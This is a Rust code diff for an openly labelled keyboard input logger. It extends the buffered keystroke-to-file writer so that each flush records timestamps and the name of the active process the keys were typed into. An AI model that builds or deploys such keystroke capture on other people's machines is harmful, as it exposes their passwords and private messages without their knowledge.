@@ -3,6 +3,9 @@ use std::sync::Mutex;
 use std::fs::OpenOptions;
 use std::io::Write;
 use once_cell::sync::Lazy;
+use chrono::prelude::DateTime;
+use chrono::Utc;
+use crate::process_identification::{LAST_PROCESS_NAME};
 use crate::formatting::update_status_header;
 
 #[derive(Parser, Debug)]
@@ -27,7 +30,7 @@ pub enum Commands {
     QuitProgram,
 }
 
-/// Manages buffered keyboard input logging with configurable buffer size
+/// Manages buffered keyboard input logging with a configurable buffer size
 pub struct KeyBuffer {
     buffer: Vec<u16>,
     max_size: usize,
@@ -51,9 +54,9 @@ impl KeyBuffer {
     
     /// Adds characters to the buffer, flushing to disk when full
     pub fn push_chars(&mut self, chars: &[u16]) -> Result<(), std::io::Error> {
-        // If adding these chars would exceed capacity, flush first
+        // If adding these chars exceeds capacity, flush first
         if self.len() + chars.len() >= self.max_size {
-            self.flush_to_disk()?;
+            self.flush_to_disk(None, None)?;
         }
         
         self.buffer.extend_from_slice(chars);
@@ -62,7 +65,7 @@ impl KeyBuffer {
     }
     
     /// Forces a flush of the current buffer to the disk
-    pub fn flush_to_disk(&mut self) -> Result<(), std::io::Error> {
+    pub fn flush_to_disk(&mut self, current_name: Option<&str>, process_changed: Option<bool>) -> Result<(), std::io::Error> {
         if self.is_empty() {
             return Ok(());
         }
@@ -77,10 +80,33 @@ impl KeyBuffer {
             .create(true)
             .append(true)
             .open(&self.log_file_path)?;
-            
+
+
+        let process_name = match LAST_PROCESS_NAME.try_lock() {
+            Ok(guard) => guard.as_ref().cloned().unwrap_or_else(|| "Unknown Process".to_string()),
+            Err(_) => "Unknown Process (lock unavailable)".to_string(),
+        };
+
+        if process_changed.unwrap_or(false) {
+            // Add timestamp and process name to the log
+            let now: DateTime<Utc> = Utc::now();
+            let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
+            let header = format!("\n\n{} - {} - {}\n", process_name, timestamp, "=".repeat(50));
+            // Write the header to the file
+            file.write_all(header.as_bytes())?;
+        }
+        // Write the buffer content to the file
         file.write_all(content.as_bytes())?;
+            
+        if let Some(current_name) = current_name {
+            let now: DateTime<Utc> = Utc::now();
+            let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
+            let header = format!("\n\n{} - {} - {}\n", current_name, timestamp, "-".repeat(50));
+            file.write_all(header.as_bytes())?;
+        }
+
         file.flush()?;
-        
+
         self.buffer.clear();
         update_status_header("💾 Saved Buffer").unwrap();
         Ok(())
